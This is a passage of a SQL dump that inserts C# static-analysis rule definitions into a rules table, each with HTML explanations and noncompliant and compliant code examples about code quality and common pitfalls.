public int pickNumber()
{
  int i = 0;
  int j = 0;

  i = i++; // Noncompliant; i is still zero

  return j++; // Noncompliant; 0 returned
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public int pickNumber()
{
  int i = 0;
  int j = 0;

  i++;
  return ++j;
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812138, 1510817812139, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (320, '"[DefaultValue]" should not be used when "[DefaultParameterValue]" is meant', 'S3451', NULL, 'csharpsquid', '<p>
    The use of <code>[DefaultValue]</code> with <code>[Optional]</code> has no more effect than <code>[Optional]</code> alone. That''s because 
    <code>[DefaultValue]</code> doesn''t actually do anything; it merely indicates the intent for the value. More than likely, 
    <code>[DefaultValue]</code> was used in confusion instead of <code>[DefaultParameterValue]</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  public void DoStuff([Optional][DefaultValue(4)]int i, int j = 5)  // Noncompliant
  {
    Console.WriteLine(i);
  }

  public static void Main()
  {
    new MyClass().DoStuff(); // prints 0
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public void DoStuff([Optional][DefaultParameterValue(4)]int i, int j = 5) 
  {
    Console.WriteLine(i);
  }

  public static void Main()
  {
    new MyClass().DoStuff(); // prints 4
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812133, 1510817812133, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (321, 'Generic exceptions should not be ignored', 'S2486', NULL, 'csharpsquid', '<p>
    When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly,
    or at least to log them.
</p>
<p>
    This rule only reports on empty catch clauses that catch generic <code>Exception</code>s.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
string text = "";
try
{
  text = File.ReadAllText(fileName);
}
catch (Exception exc) // Noncompliant
{
}
</pre>

<h2>Compliant Solution</h2>
<pre>
string text = "";
try
{
  text = File.ReadAllText(fileName);
}
catch (Exception exc)
{
  logger.Log(exc);
}
</pre>

<h2>See</h2>

<ul>
    <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'cwe,error-handling', false, 'HTML', 1510817812134, 1510817812135, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (322, '"switch/Select" statements should end with a "default/Case Else" clause', 'S131', NULL, 'csharpsquid', '<p>
    The requirement for a final <code>default</code> clause is defensive programming. The clause should either take
    appropriate action, or contain a suitable comment as to why no action is taken. Even when the <code>switch</code>
    covers all current values of an <code>enum</code>, a <code>default</code> case should still be used because there is
    no guarantee that the <code>enum</code> won''t be extended.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
int foo = 42;
switch (foo) // Noncompliant
{
  case 0:
    Console.WriteLine("foo = 0");
    break;
  case 42:
    Console.WriteLine("foo = 42");
    break;
}
</pre>

<h2>Compliant Solution</h2>

<pre>
int foo = 42;
switch (foo) // Compliant
{
  case 0:
    Console.WriteLine("foo = 0");
    break;
  case 42:
    Console.WriteLine("foo = 42");
    break;
  default:
    throw new InvalidOperationException("Unexpected value foo = " + foo);
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 15.0 - The MISRA C switch syntax shall be used.</li>
    <li>MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause</li>
    <li>MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>
    <li>MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause</li>
    <li>MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>
    <li>MISRA C:2012, 16.4 - Every switch statement shall have a default label</li>
    <li>MISRA C:2012, 16.5 - A default label shall appear as either the first or the last switch label of a switch statement</li>
    <li><a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra', false, 'HTML', 1510817812136, 1510817812136, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (323, 'Doubled prefix operators "!!" and "~~" should not be used', 'S2761', NULL, 'csharpsquid', '<p>
    Calling the <code>!</code> or <code>~</code> prefix operator twice does nothing: the second invocation undoes the first.
    Such mistakes are typically caused by accidentally double-tapping the key in question without noticing.
</p>
<p>
    Either this is a bug, if the operator was actually meant to be called once, or misleading if done on purpose.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
int v1 = 0;
bool v2 = false;

var v3 = !!v1; // Noncompliant
var v4 = ~~v2; // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
int v1 = 0;
bool v2 = false;

var v3 = !v1;
var v4 = ~v2;
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812137, 1510817812137, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (325, '"Any()" should be used to test for emptiness', 'S1155', NULL, 'csharpsquid', '<p>
    Using <code>.Count()</code> to test for emptiness works, but using <code>.Any()</code> makes the intent clearer,
    and the code more readable.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private static bool HasContent(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() > 0; // Noncompliant
}
private static bool HasContent2(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() >= 1; // Noncompliant
}
private static bool IsEmpty(IEnumerable&lt;string&gt; strings)
{
  return strings.Count() == 0; // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
private static bool HasContent(IEnumerable&lt;string&gt; strings)
{
  return strings.Any();
}

private static bool IsEmpty(IEnumerable&lt;string&gt; strings)
{
  return !strings.Any();
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812139, 1510817812140, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (326, 'Sequential tests should not check the same condition', 'S2760', NULL, 'csharpsquid', '<p>
    When the same condition is checked twice in a row, it is either confusing - why have separate checks? - or an error - some other condition
    should have been checked in the second test.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b)
{
  doTheThing(b);
}
if (a == b) // Noncompliant; is this really what was intended?
{
  doTheThing(c);
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (a == b)
{
  doTheThing(b);
  doTheThing(c);
}
</pre>

or

<pre>
if (a == b)
{
  doTheThing(b);
}
if (b == c)
{
  doTheThing(c);
}
</pre>

<h2>Exceptions</h2>
<p>
    Since it is a common pattern to test a variable, reassign it if it fails the test, then re-test it, that pattern is ignored.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,suspicious', false, 'HTML', 1510817812142, 1510817812143, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (327, '"string.ToCharArray()" should not be called redundantly', 'S3456', NULL, 'csharpsquid', '<p>
    <code>ToCharArray</code> can be omitted when the operation on the array could have been done directly on the string, such as when
    iterating over the characters in a string, and when accessing a character in a string via an array index. In those cases, explicit
    <code>ToCharArray</code> calls should be omitted.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
string str = "some string";
foreach (var c in str.ToCharArray()) // Noncompliant
{
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
string str = "some string";
foreach (var c in str)
{
  // ...
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812144, 1510817812144, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (328, '"ConfigureAwait(false)" should be used', 'S3216', NULL, 'csharpsquid', '<p>
    After an <code>await</code>ed <code>Task</code> has executed, you can continue execution in the original, calling
    thread or any arbitrary thread. Unless the rest of the code needs the context from which the <code>Task</code> was
    spawned, <code>Task.ConfigureAwait(false)</code> should be used to keep execution in the <code>Task</code> thread
    to avoid the need of context switching and the possibility of deadlocks.
</p>
<p>
    This rule raises an issue when code in a class library <code>await</code>s a <code>Task</code> and continues
    execution in the original calling thread.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var response = await httpClient.GetAsync(url);  // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
var response = await httpClient.GetAsync(url).ConfigureAwait(false);
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'multi-threading,suspicious', false, 'HTML', 1510817812145, 1510817812146, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (329, '"interface" instances should not be cast to concrete types', 'S3215', NULL, 'csharpsquid', '<p>
    Needing to cast from an <code>interface</code> to a concrete type indicates that something is wrong with the abstractions in
    use, likely that something is missing from the <code>interface</code>. Instead of casting to a discrete type, the missing
    functionality should be added to the <code>interface</code>. Otherwise there is the risk of runtime exceptions.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
  void DoStuff();
}

public class MyClass1 : IMyInterface
{
  public int Data { get { return new Random().Next(); } }

  public void DoStuff()
  {
    // TODO...
  }
}

public static class DowncastExampleProgram
{
  static void EntryPoint(IMyInterface interfaceRef)
  {
    MyClass1 class1 = (MyClass1)interfaceRef;  // Noncompliant
    int privateData = class1.Data;

    class1 = interfaceRef as MyClass1;  // Noncompliant
    if (class1 != null)
    {
      // ...
    }
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'design', false, 'HTML', 1510817812146, 1510817812150, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (330, 'IP addresses should not be hardcoded', 'S1313', NULL, 'csharpsquid', '<p>
    Hardcoding an IP address into source code is a bad idea for several reasons:
    <ul>
        <li>
            a recompile is required if the address changes
        </li>
        <li>
            it forces the same address to be used in every environment (dev, sys, qa, prod)
        </li>
        <li>
            it places the responsibility of setting the value to use in production on the shoulders of the developer
        </li>
        <li>
            it allows attackers to decompile the code and thereby discover a potentially sensitive address
        </li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var ip = "127.0.0.1";
var address = IPAddress.Parse(ip);
</pre>

<h2>Compliant Solution</h2>
<pre>
var ip = ConfigurationManager.AppSettings["myapplication.ip"];
var address = IPAddress.Parse(ip);
</pre>

<h2>Exceptions</h2>
<p>
    Although "::" is a valid IPv6 address, the rule doesn''t report on it.
</p>

<h2>See</h2>

<ul>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J</a> - Never hard code sensitive information</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert', false, 'HTML', 1510817812151, 1510817812151, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (331, 'Public methods should not have multidimensional array parameters', 'S2368', NULL, 'csharpsquid', '<p>
    Exposing methods with multidimensional array parameters require developers to have advanced knowledge about the language in
    order to be able to use them. Moreover, what exactly to pass to such parameters is not intuitive. Therefore, such methods
    should not be exposed, but can be used internally.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Program
{
    public void WriteMatrix(int[][] matrix) // Non-Compliant
    {
    }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
public class Matrix
{
    // ...
}

public class Program
{
    public void WriteMatrix(Matrix matrix) // Compliant
    {
    }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'pitfall', false, 'HTML', 1510817812152, 1510817812154, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (332, '"string.Format()" should not be called without placeholders', 'S3457', NULL, 'csharpsquid', '<p>
    There''s no need to incur the overhead of a formatting call when the string to be formatted contains no formatting symbols.
    Instead, simply use the original input string.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var s = string.Format("some text");
</pre>

<h2>Compliant Solution</h2>
<pre>
var s = "some text";
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing', false, 'HTML', 1510817812157, 1510817812157, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (434, 'Files should not have too many lines', 'S104', NULL, 'csharpsquid', '<p>
A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks.
Those smaller files will not only be easier to understand but also probably easier to test.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812309, 1510817812310, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (333, 'The simplest possible condition syntax should be used', 'S3240', NULL, 'csharpsquid', '<p>
    In the interests of keeping code clean, the simplest possible conditional syntax should be used. That means using
    the <code>??</code> operator for an assign-if-not-null operator, and using the ternary operator <code>?:</code> for
    assignment to a single variable.
</p>

<h2>Noncompliant Code Sample</h2>
<pre>
object a = null, b = null, x;

if (a != null) // Noncompliant; needlessly verbose
{
  x = a;
}
else
{
  x = b;
}

x = a != null ? a : b; // Noncompliant; better but could still be simplified

x = (a == null) ? new object() : a; // Noncompliant

if (condition) // Noncompliant
{
  x = a;
}
else
{
  x = b;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
object x;

x = a ?? b;
x = a ?? b;
x = a ?? new object();
x = condition ? a : b;
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812158, 1510817812158, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (334, 'Method parameters and caught exceptions should not be reassigned', 'S1226', NULL, 'csharpsquid', '<p>
    While it is technically correct to assign to parameters from within method bodies, it is better to use temporary variables to store intermediate results.
    This rule will typically detect cases where a constructor parameter is assigned to itself instead of a field of the same name, i.e. when <code>this</code> was forgotten.
    Allowing parameters to be assigned to also reduces the code readability as developers will not be able to know whether the original parameter or some temporary variable is being accessed without going through the whole method.
    Moreover, some developers might also expect assignments of method parameters to be visible from callers, which is not the case and can confuse them.
    All parameters should be treated as <code>readonly</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  public string name;

  public MyClass(string name)
  {
    name = name;                    // Noncompliant - useless identity assignment
  }

  public int Add(int a, int b)
  {
    a = a + b;                      // Noncompliant

    /* additional logic */

    return a;                       // Seems like the parameter is returned as is, what is the point?
  }

  public static void Main()
  {
    MyClass foo = new MyClass();
    int a = 40;
    int b = 2;
    foo.Add(a, b);                  // Variable "a" will still hold 40 after this call
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public string name;

  public MyClass(string name)
  {
    this.name = name;               // Compliant
  }

  public int Add(int a, int b)
  {
    return a + b;                   // Compliant
  }

  public static void Main()
  {
    MyClass foo = new MyClass();
    int a = 40;
    int b = 2;
    foo.Add(a, b);
  }
}
</pre>

<h2>See</h2>
<ul>
    <li>MISRA C:2012, 17.8 - A function parameter should not be modified</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,pitfall', false, 'HTML', 1510817812159, 1510817812160, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (335, 'Silly bit operations should not be performed', 'S2437', NULL, 'csharpsquid', '<p>
    Certain bit operations are just silly and should not be performed because their results are predictable.
</p>
<p>
    Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will
    <code>anyValue ^ 0</code> and <code>anyValue | 0</code>.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812160, 1510817812161, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (336, 'break statements should not be used except for switch cases', 'S1227', NULL, 'csharpsquid', '<p>
<code>break;</code> is an unstructured control flow statement which makes code harder to read.
Ideally, every loop should have a single termination condition.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
int i = 0;
while (true)
{
  if (i == 10)
  {
    break;      // Non-Compliant
  }

  Console.WriteLine(i);
  i++;
}
</pre>

<h2>Compliant Solution</h2>

<pre>
int i = 0;
while (i != 10) // Compliant
{
  Console.WriteLine(i);
  i++;
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812162, 1510817812162, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (337, 'Methods named "Dispose" should implement "IDisposable.Dispose"', 'S2953', NULL, 'csharpsquid', '<p>
    <code>Dispose</code> as a method name should be used exclusively to implement <code>IDisposable.Dispose</code> to prevent
    any confusion.
</p>
<p>
    It may be tempting to create a <code>Dispose</code> method for other purposes, but doing so will result in confusion and
    likely lead to problems in production.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class GarbageDisposal
{
  private int Dispose()  // Noncompliant
  {
    // ...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class GarbageDisposal : IDisposable
{
  public void Dispose()
  {
    // ...
  }
}
</pre>
or
<pre>
public class GarbageDisposal
{
  private int Grind()
  {
    // ...
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    Methods named <code>Dispose</code> and invoked from the <code>IDisposable.Dispose</code> implementation are not reported.
</p>
<pre>
public class GarbageDisposal : IDisposable
{
  protected virtual void Dispose(bool disposing)
  {
    //...
  }
  public void Dispose()
  {
    Dispose(true);
    GC.SuppressFinalize(this);
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812163, 1510817812163, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (338, 'Generic parameters not constrained to reference types should not be compared to "null"', 'S2955', NULL, 'csharpsquid', '<p>
    When constraints have not been applied to restrict a generic type parameter to be a reference type,
    then a value type, such as a <code>struct</code>, could also be passed. In such cases, comparing the
    type parameter to <code>null</code> would always be false, because a <code>struct</code> can
    be empty, but never <code>null</code>. If a value type is truly what''s expected, then the comparison should use
    <code>default()</code>. If it''s not, then constraints should be added so that no value type can be
    passed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private bool IsDefault&lt;T&gt;(T value)
{
  if (value == null) // Noncompliant
  {
    // ...
  }
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
private bool IsDefault&lt;T&gt;(T value)
{
  if(object.Equals(value, default(T)))
  {
    // ...
  }
  // ...
}
</pre>
or
<pre>
private bool IsDefault&lt;T&gt;(T value) where T : class
{
  if (value == null)
  {
    // ...
  }
  // ...
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812164, 1510817812164, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (339, 'A close curly brace should be located at the beginning of a line', 'S1109', NULL, 'csharpsquid', '<p>
Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the beginning of a line.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();}
</pre>

<h2>Compliant Solution</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>

<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered.</p>
<pre>
if(condition) { doSomething(); }
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812165, 1510817812166, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (340, 'Overriding members should do more than simply call the same member in the super class', 'S1185', NULL, 'csharpsquid', '<p>
    Overriding a member just to call the same member from the base class without performing any other actions is useless and
    misleading. The only time this is justified is in <code>sealed</code> overriding methods, where the effect is to lock in
    the parent class behavior.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public override void Method() // Noncompliant
{
  base.Method();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public override void Method()
{
  //do something else
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812166, 1510817812167, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (387, 'Instance members should not write to "static" fields', 'S2696', NULL, 'csharpsquid', '<p>
    Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to
    bugs if there are multiple class instances and/or multiple threads in play.
</p>
<p>
    This rule raises an issue each time a <code>static</code> field is updated from a non-static method or property.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  private static int count = 0;

  public void DoSomething()
  {
    //...
    count++;  // Noncompliant
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817812234, 1510817812234, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (341, 'Format strings should be passed the correct number of arguments', 'S2275', NULL, 'csharpsquid', '<p>
    Use fewer arguments than are expected in your format string, and you''ll get an error at runtime. Use more arguments than are
    expected, and you probably won''t get the output you expect. Either way, it''s a bug.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var s1 = string.Format("{0} {1} {2}", 1, 2); // Noncompliant; too few arguments
var s2 = string.Format("{0}", 10, 11); // Noncompliant; too many arguments
</pre>

<h2>Compliant Solution</h2>
<pre>
// Pass the expected number of arguments
